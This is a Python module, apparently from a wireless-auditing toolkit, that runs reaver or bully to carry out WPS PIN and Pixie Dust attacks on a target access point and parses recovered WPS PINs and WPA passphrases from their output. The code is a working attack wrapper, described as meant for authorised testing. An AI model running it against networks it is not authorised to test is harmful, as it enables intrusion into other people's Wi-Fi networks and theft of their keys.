"""WPS attack integration via external tools (reaver / bully).

Runs the tool as a subprocess and streams its output to a log callback. The
output parser is pure so it can be unit tested. For authorised testing only —
Pixie Dust / online PIN attacks are noisy and disruptive.
"""

from __future__ import annotations

import re
import subprocess
import threading
from typing import Callable, Dict, List, Optional

_PIN_RE = re.compile(r"WPS PIN:\s*'?([0-9]{4,8})'?")
_PSK_QUOTED_RE = re.compile(r"WPA PSK:\s*'([^']*)'")
_PSK_BARE_RE = re.compile(r"WPA PSK:\s*(\S+)")


def parse_wps_output(line: str) -> Optional[Dict[str, str]]:
    """Extract a recovered WPS PIN and/or WPA PSK from one output line."""
    result: Dict[str, str] = {}
    pin = _PIN_RE.search(line)
    if pin:
        result["pin"] = pin.group(1)
    psk = _PSK_QUOTED_RE.search(line) or _PSK_BARE_RE.search(line)
    if psk:
        result["psk"] = psk.group(1)
    return result or None


class WpsAttackService:
    def __init__(
        self,
        interface: str,
        tool: str = "reaver",
        log_callback: Optional[Callable[[str], None]] = None,
        on_result: Optional[Callable[[Dict[str, str]], None]] = None,
    ) -> None:
        self.interface = interface
        self.tool = tool
        self._log = log_callback
        self._on_result = on_result
        self._proc: Optional[subprocess.Popen] = None
        self._thread: Optional[threading.Thread] = None
        self._stop = threading.Event()

    def _build_command(self, bssid: str, channel: Optional[int]) -> List[str]:
        if self.tool == "bully":
            command = ["bully", self.interface, "-b", bssid]
            if channel:
                command += ["-c", str(channel)]
            return command
        command = ["reaver", "-i", self.interface, "-b", bssid, "-vv"]
        if channel:
            command += ["-c", str(channel)]
        return command

    def start(self, bssid: str, channel: Optional[int]) -> None:
        if self.is_running():
            self.stop()
        self._stop.clear()
        command = self._build_command(bssid, channel)
        try:
            self._proc = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
        except FileNotFoundError as exc:
            raise FileNotFoundError(
                f"Утилита '{self.tool}' не найдена. Установите reaver или bully."
            ) from exc
        self._thread = threading.Thread(target=self._reader, daemon=True)
        self._thread.start()
        if self._log:
            self._log(f"WPS-атака запущена ({self.tool}) на {bssid} канал {channel}")

    def _reader(self) -> None:
        proc = self._proc
        if not proc or not proc.stdout:
            return
        for line in proc.stdout:
            if self._stop.is_set():
                break
            line = line.rstrip()
            if not line:
                continue
            if self._log:
                self._log(f"[wps] {line}")
            result = parse_wps_output(line)
            if result and self._on_result:
                self._on_result(result)
        if self._log and not self._stop.is_set():
            self._log("WPS-атака завершена")

    def stop(self) -> None:
        self._stop.set()
        if self._proc and self._proc.poll() is None:
            try:
                self._proc.terminate()
            except Exception:  # noqa: BLE001
                pass
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2)
        self._proc = None
        self._thread = None

    def is_running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None
